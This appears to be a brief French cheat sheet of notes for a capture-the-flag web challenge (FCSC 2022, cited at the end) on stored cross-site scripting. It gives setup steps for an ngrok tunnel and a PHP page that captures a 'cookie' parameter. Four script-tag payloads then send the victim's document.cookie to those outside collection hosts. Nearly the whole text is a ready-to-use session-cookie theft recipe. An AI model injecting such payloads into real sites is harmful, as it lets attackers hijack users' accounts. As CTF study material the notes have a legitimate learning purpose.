# Stored XSS

- Setup ngrok
- Setup un serveur web python / php
- Créer un webshell basique `file.php`

`<?php $cookie = $_GET["cookie"]; ?>`

```js
<script>window.location=`https://3902-2a01--skipp--41a-64ad.eu.ngrok.io/file.php?cookie=${document.cookie}`</script>
<script>document.location="https://3902-2a01--skipp--4aaa-d8f9-41a-64ad.eu.ngrok.io/file.php?cookie="+document.cookie;</script>
```

## Variante avec requestbin

```js
<script>document.write('<IMG SRC=\"https://eowc--skipp--pedream.net?cookie='+document.cookie+'\">Hacked</IMG>');</script>`
<script>document.location.href = 'https://eowc--skipp--pedream.net?cookies =' + document.cookie;</script>
```

## Référence

https://luksec.fr/article/fcsc2022-web/#gare-au-gorille
